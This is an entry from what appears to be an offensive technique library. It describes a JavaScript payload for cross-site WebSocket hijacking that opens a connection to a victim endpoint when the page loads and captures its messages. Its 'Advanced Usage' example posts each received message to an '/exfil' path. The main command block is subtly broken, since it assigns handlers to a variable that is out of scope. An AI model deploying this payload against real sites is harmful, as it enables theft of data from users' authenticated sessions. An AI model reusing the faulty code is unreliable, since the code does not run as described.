---
id: 123e4567-e89b-12d3-a456-426614174005
name: websocket-hijack-js
type: command
executor: javascript
data: >-
  document.addEventListener('DOMContentLoaded', function() { const ws = new
  WebSocket('ws://target.com/ws'); ws.onopen = function() {
  console.log('Hijacked connection open'); }; }); ws.onmessage = function(event)
  { console.log('Hijacked message:', event.data); }; ws.onerror =
  function(error) { console.error('Hijack error:', error); };
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:35.952Z'
platforms:
  - Web
tags:
  - websocket
  - hijacking
verified: false
validated: true
submitted: true
---

# websocket-hijack-js

## Command

```javascript
document.addEventListener('DOMContentLoaded', function() {
  const ws = new WebSocket('ws://target.com/ws');
  ws.onopen = function() { console.log('Hijacked connection open'); };
});
ws.onmessage = function(event) { console.log('Hijacked message:', event.data); };
ws.onerror = function(error) { console.error('Hijack error:', error); };
```

## Description

This JavaScript command hijacks a WebSocket by auto-connecting on page load and monitoring messages, used in CSWSH exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ws://target.com/ws` | Vulnerable WebSocket endpoint | Yes |
| `DOMContentLoaded` | Trigger on page load | Yes |
| `onmessage` | Handler for incoming data | No |

## Examples

### Basic Usage

```javascript
document.addEventListener('DOMContentLoaded', function() {
  const ws = new WebSocket('ws://target.com/ws');
  ws.onopen = function() { console.log('Open'); };
});
```

### Advanced Usage

```javascript
document.addEventListener('DOMContentLoaded', function() {
  const ws = new WebSocket('ws://target.com/ws');
  ws.onopen = function() { console.log('Open'); };
  ws.onmessage = function(e) { fetch('/exfil', {method: 'POST', body: e.data}); };
});
```

## Expected Output

Console: 'Hijacked connection open' and logged messages on success.

## Related

- [[Related Procedure: Hijack-WebSocket-Connection]]
